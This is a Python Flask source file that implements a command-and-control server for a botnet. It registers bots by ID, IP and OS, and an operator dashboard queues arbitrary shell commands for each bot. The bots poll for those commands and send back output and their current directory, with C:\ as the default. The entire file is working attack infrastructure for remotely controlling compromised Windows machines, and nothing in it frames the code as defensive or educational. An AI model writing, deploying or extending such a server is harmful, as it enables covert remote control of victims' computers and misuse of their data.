from flask import Flask, request, jsonify, render_template
from datetime import datetime

app = Flask(__name__)

bots = {}          # id -> {ip, os, last_seen, cwd}
tasks = {}         # id -> [list of commands]
results = {}       # id -> "output"

@app.route('/')
def dashboard():
    return render_template('index.html')

@app.route('/room/<bot_id>')
def bot_room(bot_id):
    if bot_id not in bots:
        return "Bot not found", 404
    return render_template('room.html', bot_id=bot_id, bot_info=bots[bot_id])

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    bot_id = data.get('id')
    if bot_id:
        bots[bot_id] = {
            'ip': request.remote_addr,
            'os': data.get('os', 'Unknown'),
            'last_seen': datetime.now(),
            'cwd': 'C:\\'
        }
        if bot_id not in tasks:
            tasks[bot_id] = []
    return jsonify({"status": "ok"})

@app.route('/get_task', methods=['GET'])
def get_task():
    bot_id = request.args.get('id')
    if bot_id and bot_id in tasks and len(tasks[bot_id]) > 0:
        cmd = tasks[bot_id].pop(0)
        return jsonify({"command": cmd})
    return jsonify({"command": ""})

@app.route('/send_result', methods=['POST'])
def send_result():
    data = request.json
    bot_id = data.get('id')
    output = data.get('output')
    new_cwd = data.get('cwd')
    if bot_id:
        results[bot_id] = output
        if bot_id in bots:
            bots[bot_id]['last_seen'] = datetime.now()
            if new_cwd:
                bots[bot_id]['cwd'] = new_cwd
    return jsonify({"status": "ok"})

@app.route('/api/active_bots')
def active_bots():
    now = datetime.now()
    active_list = []
    for bot_id, info in bots.items():
        if (now - info['last_seen']).total_seconds() < 30:
            active_list.append({
                "id": bot_id,
                "ip": info['ip'],
                "os": info['os'],
                "last_seen": info['last_seen'].strftime("%H:%M:%S"),
                "cwd": info.get('cwd', 'C:\\')
            })
    return jsonify(active_list)

@app.route('/api/send_command', methods=['POST'])
def send_command():
    data = request.json
    bot_id = data.get('id')
    cmd = data.get('cmd')
    if bot_id and cmd:
        if bot_id not in tasks:
            tasks[bot_id] = []
        tasks[bot_id].append(cmd)
        return jsonify({"status": "queued"})
    return jsonify({"status": "error"}), 400

@app.route('/api/get_result', methods=['GET'])
def get_result():
    bot_id = request.args.get('id')
    if bot_id and bot_id in results:
        out = results.pop(bot_id)
        return jsonify({"output": out})
    return jsonify({"output": ""})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)